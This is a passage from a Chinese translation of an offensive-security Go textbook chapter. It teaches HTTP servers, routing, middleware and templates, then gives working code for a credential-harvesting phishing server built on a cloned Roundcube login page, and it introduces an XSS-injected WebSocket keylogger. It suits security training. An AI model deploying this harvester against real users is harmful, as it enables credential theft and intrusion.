## 第四章：HTTP 服务器、路由和中间件

![Image](img/common.jpg)

如果您知道如何从头编写 HTTP 服务器，您可以为社交工程、命令与控制（C2）传输、API 和前端工具等创建定制化的逻辑。幸运的是，Go 提供了一个出色的标准包——`net/http`——用于构建 HTTP 服务器；它几乎是您编写不仅是简单服务器，还是复杂、功能完备的 Web 应用程序所需的一切。

除了标准包外，您还可以利用第三方包来加速开发，去除一些繁琐的过程，如模式匹配。这些包将帮助您进行路由、构建中间件、验证请求以及其他任务。

在本章中，您将首先探索构建 HTTP 服务器所需的许多技术，并通过简单的应用程序进行实践。接着，您将使用这些技术创建两个社交工程应用程序——凭证收集服务器和键盘记录服务器，并多路复用 C2 通道。

### HTTP 服务器基础

在本节中，您将通过构建简单的服务器、路由器和中间件，探索 `net/http` 包及一些有用的第三方包。我们将在本章后续内容中扩展这些基础知识，涵盖更多恶意示例。

#### 构建一个简单的服务器

列表 4-1 中的代码启动了一个处理单一路径请求的服务器。（所有位于根目录 / 的代码清单都可以在提供的 GitHub 仓库 *[`github.com/blackhat-go/bhg/`](https://github.com/blackhat-go/bhg/)* 中找到。）服务器应该获取包含用户名称的 `name` URL 参数，并返回自定义的问候语。

```
package main

import (
    "fmt"
    "net/http"
)

func hello(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "Hello %s\n", r.URL.Query().Get("name"))
}

func main() {
 ❶ http.HandleFunc("/hello", hello)
 ❷ http.ListenAndServe(":8000", nil)
}
```

*列表 4-1：一个 Hello World 服务器 (*[/ch-4/hello_world/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-4/hello_world/main.go)*)*

这个简单的例子暴露了一个 `/hello` 资源。该资源抓取参数并将其值回显给客户端。在 `main()` 函数中，`http.HandleFunc()` ❶ 接受两个参数：一个字符串，它是您指示服务器查找的 URL 路径模式；另一个是一个函数，实际处理请求。如果您愿意，可以将函数定义作为匿名内联函数提供。在这个例子中，您传入的是之前定义的名为 `hello()` 的函数。

`hello()` 函数处理请求并返回一条问候消息给客户端。它自身接受两个参数。第一个是 `http.ResponseWriter`，用于写入响应内容。第二个参数是指向 `http.Request` 的指针，它允许您从传入的请求中读取信息。请注意，您并不是从 `main()` 调用 `hello()` 函数。您只是告诉 HTTP 服务器，任何指向 `/hello` 的请求应该由名为 `hello()` 的函数来处理。

在背后，`http.HandleFunc()` 实际上是做什么的呢？Go 文档告诉你，它将处理程序放置在 `DefaultServerMux` 上。`ServerMux` 是 *服务器多路复用器*（server multiplexer）的缩写，这只是一个花哨的说法，表示底层代码能够处理多个 HTTP 请求，匹配不同的模式和功能。它通过使用 goroutines 来实现，每个传入请求都有一个 goroutine。导入 `net/http` 包会创建一个 `ServerMux` 并将其附加到该包的命名空间中；这就是 `DefaultServerMux`。

下一行是对 `http.ListenAndServe()` ❷ 的调用，它接受一个字符串和一个 `http.Handler` 作为参数。这会通过使用第一个参数作为地址来启动 HTTP 服务器。在这个例子中，是 `:8000`，意味着服务器应该在所有接口上监听端口 8000。对于第二个参数，即 `http.Handler`，你传递 `nil`。结果是该包使用 `DefaultServerMux` 作为底层处理程序。很快，你将实现自己的 `http.Handler` 并传入它，但现在你只会使用默认的。你也可以使用 `http.ListenAndServeTLS()`，它将启动一个使用 HTTPS 和 TLS 的服务器，正如其名称所示，但需要额外的参数。

实现 `http.Handler` 接口需要一个方法：`ServeHTTP(http.ResponseWriter, *http.Request)`。这非常棒，因为它简化了创建自定义 HTTP 服务器的过程。你会发现许多第三方实现扩展了 `net/http` 功能，增加了中间件、认证、响应编码等功能。

你可以使用 `curl` 来测试这个服务器：

```
$ curl -i http://localhost:8000/hello?name=alice
HTTP/1.1 200 OK
Date: Sun, 12 Jan 2020 01:18:26 GMT
Content-Length: 12
Content-Type: text/plain; charset=utf-8

Hello alice
```

太好了！你构建的服务器可以读取 `name` URL 参数并回复问候信息。

#### 构建一个简单的路由器

接下来，你将构建一个简单的路由器，见 清单 4-2，它演示了如何通过检查 URL 路径动态处理传入请求。根据 URL 是否包含路径 `/a`、`/b` 或 `/c`，你将分别打印 `Executing /a`、`Executing /b` 或 `Executing /c`。对于其他情况，你将打印 `404 Not Found` 错误。

```
   package main

   import (
       "fmt"
       "net/http"
   )

❶ type router struct {
   }

❷ func (r *router) ServeHTTP(w http.ResponseWriter, req *http.Request) {
    ❸ switch req.URL.Path {
       case "/a":
           fmt.Fprint(w, "Executing /a")
 case "/b":
           fmt.Fprint(w, "Executing /b")
       case "/c":
           fmt.Fprint(w, "Executing /c")
       default:
           http.Error(w, "404 Not Found", 404)
       }
   }

   func main() {
       var r router
    ❹ http.ListenAndServe(":8000", &r)
   }
```

*清单 4-2：一个简单的路由器 (*[/ch-4/simple_router/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-4/simple_router/main.go)*)*

首先，你定义一个名为 `router` 的新类型，且不带任何字段 ❶。你将使用这个类型来实现 `http.Handler` 接口。为此，你必须定义 `ServeHTTP()` 方法 ❷。该方法使用一个 `switch` 语句来判断请求的 URL 路径 ❸，根据路径执行不同的逻辑。它使用默认的 `404 Not Found` 响应行为。在 `main()` 中，你创建一个新的 `router`，并将其指针传递给 `http.ListenAndServe()` ❹。

让我们在终端中试试这个：

```
$ curl http://localhost:8000/a
Executing /a
$ curl http://localhost:8000/d
404 Not Found
```

一切按预期工作；对于包含`/a`路径的 URL，程序返回消息`Executing` `/a`，对于不存在的路径则返回 404 响应。这是一个简单的示例。你将使用的第三方路由器将具有更复杂的逻辑，但这应该能给你一个基本的理解，帮助你了解它们是如何工作的。

#### 构建简单的中间件

现在让我们构建*中间件*，这是一种包装器，将在所有传入请求上执行，无论目标函数是什么。在列表 4-3 中的示例中，你将创建一个日志记录器，显示请求的处理开始和结束时间。

```
   Package main

   import (
           "fmt"
           "log"
           "net/http"
           "time"
   )

❶ type logger struct {
           Inner http.Handler
   }

❷ func (l *logger) ServeHTTP(w http.ResponseWriter, r *http.Request) {
           log.Println("start")
        ❸ l.Inner.ServeHTTP(w, r)
           log.Println("finish")
   }

   func hello(w http.ResponseWriter, r *http.Request) {
           fmt.Fprint(w, "Hello\n")
   }

   func main() {
        ❹ f := http.HandlerFunc(hello)
        ❺ l := logger{Inner: f}
        ❻ http.ListenAndServe(":8000", &l)
   }
```

*列表 4-3：简单中间件 (*[/ch-4/simple_middleware/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-4/simple_middleware/main.go)*)*

本质上，你所做的是创建一个外部处理程序，在每个请求中，记录服务器上的一些信息并调用你的`hello()`函数。你将这个日志记录逻辑包裹在你的函数周围。

与路由示例一样，你定义了一个名为`logger`的新类型，但这一次你有一个字段`Inner`，它本身是一个`http.Handler` ❶。在你的`ServeHTTP()`定义中 ❷，你使用`log()`打印请求的开始和结束时间，并在中间调用内部处理程序的`ServeHTTP()`方法 ❸。对于客户端来说，请求将在内部处理程序中完成。在`main()`中，你使用`http.HandlerFunc()`将函数转换为`http.Handler` ❹。你创建了`logger`，将`Inner`设置为你新创建的处理程序 ❺。最后，你使用指向`logger`实例的指针启动服务器 ❻。

运行此程序并发出请求将输出两条消息，包含请求的开始和结束时间：

```
$ go build -o simple_middleware
$ ./simple_middleware
2020/01/16 06:23:14 start
2020/01/16 06:23:14 finish
```

在接下来的章节中，我们将深入探讨中间件和路由，并使用一些我们最喜欢的第三方包，这些包让你能够创建更动态的路由并在链内执行中间件。我们还将讨论一些中间件的用例，这些用例涉及更复杂的场景。

#### 使用 gorilla/mux 包进行路由

如列表 4-2 所示，你可以使用路由来将请求路径匹配到函数。但你也可以用它来匹配其他属性——如 HTTP 动词或主机头——到一个函数。在 Go 生态系统中有几个第三方路由器可以使用。在这里，我们将介绍其中一个：`gorilla/mux`包。但就像任何事情一样，我们鼓励你通过在遇到其他包时进行研究，来扩展你的知识。

`gorilla/mux`包是一个成熟的第三方路由包，它允许你根据简单和复杂的模式进行路由。它包括正则表达式、参数匹配、动词匹配和子路由等功能。

让我们看看几个使用路由器的示例。没有必要运行这些示例，因为你很快就会在实际程序中使用它们，但请随意玩耍和实验。

在你可以使用`gorilla/mux`之前，你必须先执行`go get`命令：

```
$ go get github.com/gorilla/mux
```

现在，你可以开始路由了。使用`mux.NewRouter()`来创建你的路由器：

```
r := mux.NewRouter()
```

返回的类型实现了`http.Handler`，但还有许多其他相关方法。你最常用的是`HandleFunc()`。例如，如果你想定义一个新的路由来处理 GET 请求，模式为`/foo`，你可以这样写：

```
r.HandleFunc("/foo", func(w http.ResponseWriter, req *http.Request) {
    fmt.Fprint(w, "hi foo")
}).Methods("GET")❶
```

现在，由于调用了`Methods()` ❶，只有 GET 请求会匹配这个路由。所有其他方法将返回 404 响应。你可以在此基础上链接其他限定条件，例如`Host(string)`，它匹配特定的主机头值。例如，以下将仅匹配主机头设置为*www.foo.com*的请求：

```
r.HandleFunc("/foo", func(w http.ResponseWriter, req *http.Request) {
    fmt.Fprint(w, "hi foo")
}).Methods("GET").Host("www.foo.com")
```

有时在请求路径中匹配并传递参数是有帮助的（例如，在实现 RESTful API 时）。使用`gorilla/mux`这很简单。以下内容将打印出请求路径中`/users/`后的任何内容：

```
r.HandleFunc("/users/{user}", func(w http.ResponseWriter, req *http.Request) {
    user := mux.Vars(req)["user"]
    fmt.Fprintf(w, "hi %s\n", user)
}).Methods("GET")
```

在路径定义中，你使用花括号来定义请求参数。把它当作一个命名的占位符。然后，在处理函数中，你调用`mux.Vars()`，并将请求对象传递给它，这样就会返回一个`map[string]string`——一个请求参数名称及其相应值的映射。你提供命名占位符`user`作为键。因此，访问`/users/bob`的请求应该会为 Bob 提供一个问候：

```
$ curl http://localhost:8000/users/bob
hi bob
```

你可以更进一步，使用正则表达式来限定传递的模式。例如，你可以指定`user`参数必须是小写字母：

```
r.HandleFunc("/users/{user:[a-z]+}", func(w http.ResponseWriter, req *http.Request) {
    user := mux.Vars(req)["user"]
    fmt.Fprintf(w, "hi %s\n", user)
}).Methods("GET")
```

现在，任何不匹配该模式的请求将返回 404 响应：

```
$ curl -i http://localhost:8000/users/bob1
HTTP/1.1 404 Not Found
```

在下一节中，我们将扩展路由功能，加入一些中间件实现，使用其他库。这将增加你处理 HTTP 请求的灵活性。

#### 使用 Negroni 构建中间件

我们之前展示的简单中间件记录了请求处理的开始和结束时间，并返回了响应。中间件不必作用于每一个传入的请求，但大多数时候是这样的。使用中间件的原因有很多，包括记录请求、身份验证和授权用户、映射资源等。

例如，你可以为执行基本身份验证编写中间件。它可以解析每个请求的授权头，验证提供的用户名和密码，并在凭据无效时返回 401 响应。你还可以将多个中间件函数连接在一起，按顺序执行，第一个执行后下一个定义的函数会被运行。

对于本章前面创建的日志中间件，你只包装了一个单一的函数。实际上，这样做并不太有用，因为你会想使用多个中间件，而要做到这一点，你必须有能将它们按顺序执行的逻辑。从头编写这个并不特别困难，但我们不必重新发明轮子。在这里，你将使用一个已经能够做到这一点的成熟包：`negroni`。

`negroni`包，你可以在[*https://github.com/urfave/negroni/*](https://github.com/urfave/negroni/)找到，它非常棒，因为它不把你绑在一个更大的框架中。你可以很容易地将它与其他框架结合使用，并且它提供了很大的灵活性。它还自带许多应用中很有用的默认中间件。在开始之前，你需要运行`go get negroni`：

```
$ go get github.com/urfave/negroni
```

虽然从技术上讲，你可以使用`negroni`来处理所有应用逻辑，但这样做远非理想，因为它是专门为中间件而设计的，并不包含路由器。因此，最好的做法是将`negroni`与另一个包结合使用，例如`gorilla/mux`或`net/http`。我们将使用`gorilla/mux`来构建一个程序，这样你就能熟悉`negroni`并看到它在中间件链中按顺序遍历时的操作顺序。

从创建一个名为*main.go*的新文件开始，放置在某个目录命名空间中，例如* [github.com/blackhat-go/bhg/ch-4/negroni_example/](http://github.com/blackhat-go/bhg/ch-4/negroni_example/)*。(如果你已经克隆了 BHG 的 GitHub 仓库，这个命名空间将已经创建。)现在，修改你的*main.go*文件，加入以下代码。

```
package main

import (
    "net/http"

    "github.com/gorilla/mux"
    "github.com/urfave/negroni"
)

func main() {
 ❶ r := mux.NewRouter()
 ❷ n := negroni.Classic()
 ❸ n.UseHandler(r)
    http.ListenAndServe(":8000", n)
}
```

*Listing 4-4: Negroni 示例 (*[/ch-4/negroni_example/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-4/negroni_example/main.go)*)*

首先，通过调用`mux.NewRouter()` ❶，像本章前面那样创建一个路由器。接下来，你将首次与`negroni`包进行交互：调用`negroni.Classic()` ❷。这会创建一个指向`Negroni`实例的新指针。

这样做有不同的方式。你可以使用`negroni.Classic()`，也可以调用`negroni.New()`。前者`negroni.Classic()`会设置默认的中间件，包括请求日志记录器、能够拦截并从 panic 中恢复的恢复中间件，以及提供同一目录中 public 文件夹中文件的中间件。而`negroni.New()`函数则不会创建任何默认中间件。

每种类型的中间件都可以在`negroni`包中找到。例如，你可以通过以下方式使用恢复包：

```
n.Use(negroni.NewRecovery())
```

接下来，你通过调用`n.Use``Handler(r)` ❸将路由器添加到中间件堆栈中。在继续规划和构建中间件时，要考虑执行顺序。例如，你希望在需要身份验证的处理函数之前运行身份验证检查中间件。任何在路由器之前挂载的中间件都会在你的处理函数之前执行；任何在路由器之后挂载的中间件都会在你的处理函数之后执行。顺序很重要。在这种情况下，你还没有定义任何自定义中间件，但你很快会这样做。

继续构建你在清单 4-4 中创建的服务器，并执行它。然后向服务器发送 Web 请求，访问 *http://localhost:8000*。你应该能看到`negroni`的日志中间件将信息打印到 stdout，如下所示。输出会显示时间戳、响应代码、处理时间、主机和 HTTP 方法：

```
$ go build -s negroni_example
$ ./negroni_example
 [negroni] 2020-01-19T11:49:33-07:00 | 404 |      1.0002ms | localhost:8000 | GET
```

拥有默认中间件是很好的，但真正的力量在于你创建自己的中间件。使用`negroni`，你可以使用几种方法将中间件添加到堆栈中。看看下面的代码。它创建了一个简单的中间件，打印一条信息并将执行传递给链中的下一个中间件：

```
type trivial struct {
}
func (t *trivial) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) { ❶
    fmt.Println("Executing trivial middleware")
    next(w, r) ❷
}
```

这个实现与之前的示例略有不同。之前，你是实现了`http.Handler`接口，该接口期望有一个`ServeHTTP()`方法，该方法接受两个参数：`http.ResponseWriter`和`*http.Request`。在这个新的示例中，你不是实现`http.Handler`接口，而是实现了`negroni.Handler`接口。

轻微的不同在于，`negroni.Handler`接口期望你实现一个`ServeHTTP()`方法，该方法接受三个参数，而不是两个：`http.ResponseWriter`、`*http.Request`和`http.HandlerFunc` ❶。`http.HandlerFunc`参数表示链中下一个中间件函数。为了你的目的，你可以将它命名为`next`。你在`ServeHTTP()`中进行处理，然后调用`next()` ❷，将最初接收到的`http.ResponseWriter`和`*http.Request`值传递给它。这有效地将执行权传递到链中的下一个中间件。

但你仍然需要告诉`negroni`使用你的实现作为中间件链的一部分。你可以通过调用`negroni`的`Use`方法，并将你的`negroni.Handler`实现的实例传递给它来实现这一点：

```
n.Use(&trivial{})
```

使用这种方法编写中间件非常方便，因为你可以轻松地将执行权传递给下一个中间件。唯一的缺点是：你编写的任何内容都必须使用`negroni`。例如，如果你正在编写一个中间件包，它将安全头信息写入响应中，你可能希望它实现`http.Handler`，这样就可以在其他应用程序堆栈中使用它，因为大多数堆栈不会期望`negroni.Handler`。重点是，不论你的中间件目的是什么，在非`negroni`堆栈中使用`negroni`中间件时可能会出现兼容性问题，反之亦然。

还有两种方式可以告诉`negroni`使用你的中间件。第一种是你已经熟悉的`UseHandler(handler http.Handler)`。第二种方式是调用`UseHandleFunc(handlerFunc func(w http.ResponseWriter, r *http.Request))`。后者不建议频繁使用，因为它不允许你跳过执行链中下一个中间件。例如，如果你编写一个进行身份验证的中间件，当凭证或会话信息无效时，你可能想返回 401 响应并停止执行；使用这种方法无法实现这一点。

#### 使用 Negroni 添加身份验证

在继续之前，让我们修改上一节的示例，演示如何使用`context`，它可以轻松地在函数之间传递变量。 列表 4-5 中的示例使用`negroni`添加了身份验证中间件。

```
package main

import (
    "context"
    "fmt"
    "net/http"

    "github.com/gorilla/mux"
    "github.com/urfave/negroni"
)

type badAuth struct { ❶
    Username string
    Password string
}

func (b *badAuth) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) { ❷
    username := r.URL.Query().Get("username") ❸
    password := r.URL.Query().Get("password")
    if username != b.Username || password != b.Password {
        http.Error(w, "Unauthorized", 401)
        return ❹
    }
    ctx := context.WithValue(r.Context(), "username", username) ❺
    r = r.WithContext(ctx) ❻
    next(w, r)
}

func hello(w http.ResponseWriter, r *http.Request) {
    username := r.Context().Value("username").(string) ❼
    fmt.Fprintf(w, "Hi %s\n", username)
}

func main() {
    r := mux.NewRouter()
    r.HandleFunc("/hello", hello).Methods("GET")
    n := negroni.Classic()
    n.Use(&badAuth{
        Username: "admin",
        Password: "password",
    })
    n.UseHandler(r)
    http.ListenAndServe(":8000", n)
}
```

*列表 4-5：在处理程序中使用上下文（*/[ch-4/negroni_example/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-4/negroni_example/main.go)*)*

你已添加了新的中间件`badAuth`，它将模拟身份验证，仅用于演示目的❶。这个新类型有两个字段，`Username`和`Password`，并实现了`negroni.Handler`，因为它定义了我们之前讨论过的三参数版本的`ServeHTTP()`方法❷。在`ServeHTTP()`方法内部，你首先从请求中获取用户名和密码❸，然后将其与已有字段进行比较。如果用户名和密码不正确，执行将停止，并向请求方写入 401 响应。

请注意，在调用`next()`之前你先返回❹。这可以防止中间件链的其余部分继续执行。如果凭证正确，你将通过一个相当冗长的例程将用户名添加到请求上下文中。你首先调用`context.WithValue()`初始化请求上下文，并在该上下文中设置一个名为`username`的变量❺。然后，你通过调用`r.WithContext(ctx)`来确保请求使用你的新上下文❻。如果你打算使用 Go 编写 Web 应用程序，你需要熟悉这种模式，因为你会频繁使用它。

在`hello()`函数中，你通过使用`Context().Value(interface{})`函数从请求上下文中获取用户名，该函数本身返回一个`interface{}`。因为你知道它是一个字符串，所以可以在这里使用类型断言❼。如果你不能保证类型，或者不能确保该值在上下文中存在，请使用`switch`语句进行转换。

构建并执行列表 4-5 中的代码，向服务器发送几个请求。发送一些包含正确和错误凭证的请求。你应该能看到以下输出：

```
$ curl -i http://localhost:8000/hello
HTTP/1.1 401 Unauthorized
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
Date: Thu, 16 Jan 2020 20:41:20 GMT
Content-Length: 13
Unauthorized
$ curl -i 'http://localhost:8000/hello?username=admin&password=password'
HTTP/1.1 200 OK
Date: Thu, 16 Jan 2020 20:41:05 GMT
Content-Length: 9
Content-Type: text/plain; charset=utf-8

Hi admin
```

在没有凭证的情况下发出请求将导致你的中间件返回 401 Unauthorized 错误。使用有效凭证发送相同的请求将返回一个只有经过身份验证的用户才能访问的超级机密问候消息。

这真是太多内容需要消化了。到目前为止，你的处理函数仅仅使用了`fmt.FPrintf()`来将响应写入`http.ResponseWriter`实例。在接下来的部分，你将会了解使用 Go 的模板包以一种更动态的方式返回 HTML。

#### 使用模板生成 HTML 响应

*模板*允许你动态生成内容，包括 HTML，并且可以通过 Go 程序中的变量进行控制。许多语言都有第三方包支持生成模板。Go 有两个模板包，`text/template` 和 `html/template`。在本章中，你将使用 HTML 包，因为它提供了你所需的上下文编码。

Go 包的一个精彩之处在于它具有上下文感知能力：它会根据变量在模板中的位置以不同的方式编码你的变量。例如，如果你将一个字符串作为 URL 提供给 `href` 属性，这个字符串将被 URL 编码；但如果它在 HTML 元素内渲染，则同样的字符串将会被 HTML 编码。

要创建和使用模板，你首先需要定义模板，其中包含一个占位符，用以表示要渲染的动态上下文数据。其语法应该对那些使用过 Python 中 Jinja 的读者来说很熟悉。当你渲染模板时，你会将一个变量传递给它，作为此上下文使用。这个变量可以是一个包含多个字段的复杂结构，也可以是一个简单的原始变量。

让我们通过一个示例来说明，如 清单 4-6 所示，创建一个简单的模板并用 JavaScript 填充占位符。这是一个人为设计的示例，展示了如何动态地填充返回给浏览器的内容。

```
   package main

   import (
       "html/template"
       "os"
   )

❶ var x = `
   <html>
     <body>

 ❷ Hello {{.}}
     </body>
   </html>
   `

   func main() {
    ❸ t, err := template.New("hello").Parse(x)
       if err != nil {
           panic(err)
       }
    ❹ t.Execute(os.Stdout, "<script>alert('world')</script>")
   }
```

*清单 4-6：HTML 模板 (*[/ch-4/template_example/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-4/template_example/main.go)*)*

首先，你创建一个名为`x`的变量，用来存储你的 HTML 模板 ❶。在这里，你将代码中的字符串嵌入作为模板，但大多数时候你会希望将模板存储为单独的文件。注意，模板不过是一个简单的 HTML 页面。在模板内部，你通过使用`{{`变量名`}}`约定来定义占位符，其中变量名是你希望渲染的上下文数据中的数据元素 ❷。回想一下，这可以是一个结构体或其他原始数据类型。在这个例子中，你使用的是单个句点，这表示包会渲染整个上下文。由于你将处理单一字符串，这没有问题，但如果你有一个更大且更复杂的数据结构，例如结构体，你可以通过访问句点后面的字段来获取你需要的字段。例如，如果你将一个包含`Username`字段的结构体传递给模板，你可以使用`{{.Username}}`来渲染该字段。

接下来，在你的`main()`函数中，你通过调用`template.New(`string`)` ❸来创建一个新的模板。然后，你调用`Parse(`string`)`以确保模板格式正确并进行解析。这两个函数一起返回一个指向`Template`的新指针。

虽然这个示例只使用了一个模板，但你可以在其他模板中嵌入模板。当使用多个模板时，重要的是要为它们命名，以便能够调用它们。最后，你调用`Execute(`io.Writer`,` interface`{})` ❹，该方法通过使用作为第二个参数传入的变量来处理模板，并将结果写入提供的`io.Writer`。为了演示，你将使用`os.Stdout`。传入`Execute()`方法的第二个变量是用于渲染模板的上下文。

运行此代码会生成 HTML，你应该注意到作为上下文一部分提供的脚本标签和其他恶意字符已被正确编码。真酷！

```
$ go build -o template_example
$ ./template_example

<html>
  <body>
    Hello &lt;script&gt;alert(&#39;world&#39;)&lt;/script&gt;
 </body>
</html>
```

我们本可以说更多关于模板的内容。你可以与它们一起使用逻辑运算符；你可以将它们与循环和其他控制结构一起使用。你可以调用内置函数，甚至可以定义和公开任意的辅助函数，以大大扩展模板的能力。双倍的酷！我们建议你深入研究并探索这些可能性。它们超出了本书的范围，但非常强大。

怎么样，暂时离开创建服务器和处理请求的基础知识，转而关注一些更为险恶的东西吧。让我们来创建一个凭证收集器！

### 凭证收集

社会工程学的一个常见攻击手段是 *凭证收集攻击*。这种攻击通过让用户在克隆的原始网站版本中输入凭证，来捕获用户登录某些网站的信息。该攻击对暴露单一身份验证接口的组织尤其有效。一旦你获得了用户的凭证，就可以用它们访问该用户在原始网站上的账户。这通常会导致组织外围网络的首次入侵。

Go 为这种类型的攻击提供了一个出色的平台，因为它可以快速启动新的服务器，并且使配置路由和解析用户提供的输入变得容易。你可以为凭证收集服务器添加许多自定义和功能，但在这个示例中，我们还是先从基础部分开始。

首先，你需要克隆一个有登录表单的站点。这里有很多选择。实际上，你可能会想克隆一个目标正在使用的站点。不过在这个例子中，你将克隆一个 Roundcube 站点。*Roundcube* 是一个开源的网页邮箱客户端，虽然不像微软 Exchange 等商业软件那样常用，但仍能很好地帮助我们说明这些概念。你将使用 Docker 来运行 Roundcube，因为它使得这个过程变得更加简便。

你可以通过执行以下命令启动一个属于自己的 Roundcube 服务器。如果你不想运行 Roundcube 服务器，也不用担心；练习源代码中已经有该站点的克隆版本。不过，为了完整性，我们还是包括了这个部分：

```
$ docker run --rm -it -p 127.0.0.180:80 robbertkl/roundcube
```

该命令启动了一个 Roundcube Docker 实例。如果你访问 *http://127.0.0.1:80*，你将看到一个登录表单。通常，你会使用 `wget` 克隆一个站点及其所有必要的文件，但 Roundcube 具有 JavaScript 强大功能，阻止了这种方法的使用。相反，你将使用 Google Chrome 来保存该站点。在练习文件夹中，你应该能看到一个类似于 列表 4-7 的目录结构。

```
$ tree
.
+-- main.go
+-- public
   +-- index.html
   +-- index_files
       +-- app.js
       +-- common.js
       +-- jquery-ui-1.10.4.custom.css
       +-- jquery-ui-1.10.4.custom.min.js
       +-- jquery.min.js
       +-- jstz.min.js
       +-- roundcube_logo.png
       +-- styles.css
       +-- ui.js
    index.html
```

*列表 4-7：* [/ch-4/credential_harvester/](https://github.com/blackhat-go/bhg/blob/master/ch-4/credential_harvester/) 的目录列表

*public* 目录中的文件代表着未更改的克隆登录站点。你需要修改原始登录表单，以便将输入的凭证重定向并发送到你自己，而不是合法的服务器。首先，打开 *public/index.html* 并找到用于提交登录请求的表单元素。它应该类似于以下内容：

```
<form name="form" method="post" action="http://127.0.0.1/?_task=login">
```

你需要修改这个标签的 `action` 属性，并将其指向你的服务器。将 `action` 改为 `/login`。别忘了保存。该行现在应该如下所示：

```
<form name="form" method="post" action="/login">
```

为了正确呈现登录表单并捕获用户名和密码，你首先需要提供 *public* 目录中的文件。然后你需要为 `/login` 编写一个 `HandleFunc` 来捕获用户名和密码。你还希望将捕获到的凭证存储在文件中，并进行详细日志记录。

你只需要几十行代码就可以处理这一切。Listing 4-8 展示了完整的程序。

```
package main

import (
    "net/http"
    "os"
    "time"

    log "github.com/Sirupsen/logrus" ❶
    "github.com/gorilla/mux"
)

func login(w http.ResponseWriter, r *http.Request) {
    log.WithFields(log.Fields{ ❷
        "time":       time.Now().String(),
        "username":   r.FormValue("_user"), ❸
        "password":   r.FormValue("_pass"), ❹
        "user-agent": r.UserAgent(),
        "ip_address": r.RemoteAddr,
    }).Info("login attempt")
    http.Redirect(w, r, "/", 302)
}

func main() {
    fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600) ❺
    if err != nil {
        panic(err)
    }
    defer fh.Close()
    log.SetOutput(fh) ❻
    r := mux.NewRouter()
    r.HandleFunc("/login", login).Methods("POST") ❼
    r.PathPrefix("/").Handler(http.FileServer(http.Dir("public"))) ❽
    log.Fatal(http.ListenAndServe(":8080", r))
}
```

*Listing 4-8: 凭证收集服务器 (*[/ch-4/credential_harvester/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-4/credential_harvester/main.go)*)*

首先需要注意的是，你导入了`github.com/Sirupsen/logrus` ❶。这是一个结构化日志包，我们推荐使用它，而不是标准的 Go `log`包。它提供了更多可配置的日志选项，便于更好的错误处理。要使用此包，你需要确保在之前运行了`go get`。

接下来，你定义了`login()`处理函数。希望这个模式看起来很熟悉。在这个函数内，你使用`log.WithFields()`来记录你捕获的数据❷。你会显示当前时间、用户代理和请求者的 IP 地址。你还会调用`FormValue(`string`)`来捕获提交的用户名(`_user`)❸和密码(`_pass`)❹值。你从*index.html*中获取这些值，并通过查找每个用户名和密码的表单输入元素来定位它们。你的服务器需要明确与登录表单中的字段名称对齐。

以下代码片段提取自*index.html*，展示了相关的输入项，元素名称加粗以便于理解：

```
<td class="input"><input name="_user" id="rcmloginuser" required="required"
size="40" autocapitalize="off" autocomplete="off" type="text"></td>
<td class="input"><input name="_pass" id="rcmloginpwd" required="required"
size="40" autocapitalize="off" autocomplete="off" type="password"></td>
```

在你的`main()`函数中，你首先打开一个文件，用来存储你捕获的数据❺。然后，你使用`log.SetOutput(`io.Writer`)`，并传入你刚创建的文件句柄，来配置日志包，使其将输出写入该文件❻。接着，你创建一个新的路由器，并挂载`login()`处理函数❼。

在启动服务器之前，你需要做一件可能看起来不熟悉的事情：你告诉路由器从目录❽中提供静态文件。这样，你的 Go 服务器就能明确知道静态文件——如图片、JavaScript、HTML——存放的位置。Go 让这一切变得简单，并且提供了防止目录遍历攻击的保护措施。从内到外，你使用`http.Dir(`string`)`来定义你希望提供文件的目录。这个结果将作为输入传递给`http.FileServer(`FileSystem`)`，后者会为你的目录创建一个`http.Handler`。你将通过使用`PathPrefix(`string`)`将其挂载到路由器上。使用`/`作为路径前缀将匹配任何未找到匹配项的请求。注意，默认情况下，`FileServer`返回的处理器支持目录索引。这可能会泄漏一些信息。可以禁用此功能，但我们这里不做讨论。

最后，像之前一样，你启动了服务器。构建并执行了 Listing 4-8 中的代码后，打开你的网页浏览器并导航到*http://localhost:8080*。尝试提交一个用户名和密码到表单。然后返回终端，退出程序，查看显示在此处的*credentials.txt*文件：

```
$ go build -o credential_harvester
$ ./credential_harvester
^C
$ cat credentials.txt
INFO[0038] login attempt
ip_address="127.0.0.1:34040" password="p@ssw0rd1!" time="2020-02-13
21:29:37.048572849 -0800 PST" user-agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64;
rv:51.0) Gecko/20100101 Firefox/51.0" username=bob
```

看这些日志！你可以看到你提交了用户名 `bob` 和密码 `p@ssw0rd1!`。你的恶意服务器成功处理了表单的 POST 请求，捕获了输入的凭证，并将其保存到文件中以供离线查看。作为攻击者，你可以尝试使用这些凭证对目标组织进行攻击，进一步展开破坏行为。

在下一节中，你将通过一种变体的凭证收集技巧进行实践。你将不再等待表单提交，而是创建一个键盘记录器来实时捕获按键。

### 使用 WebSocket API 进行键盘记录

*WebSocket API (WebSockets)* 是一种全双工协议，近年来越来越受欢迎，许多浏览器现在都支持它。它提供了一种高效的方式，允许 web 应用程序服务器与客户端之间进行通信。最重要的是，它允许服务器在不需要轮询的情况下向客户端发送消息。

WebSocket 非常适合构建“实时”应用程序，如聊天和游戏，但你也可以将其用于恶意目的，例如将键盘记录器注入应用程序，捕获用户按下的每一个键。首先，假设你已识别出一个存在*跨站脚本*（即第三方可以在受害者浏览器中运行任意 JavaScript 的漏洞）漏洞的应用程序，或者你已经攻破了一个 web 服务器，可以修改应用程序的源代码。这两种情况都应该允许你包含一个远程 JavaScript 文件。接下来，你将构建服务器基础设施来处理来自客户端的 WebSocket 连接，并处理传入的按键信息。

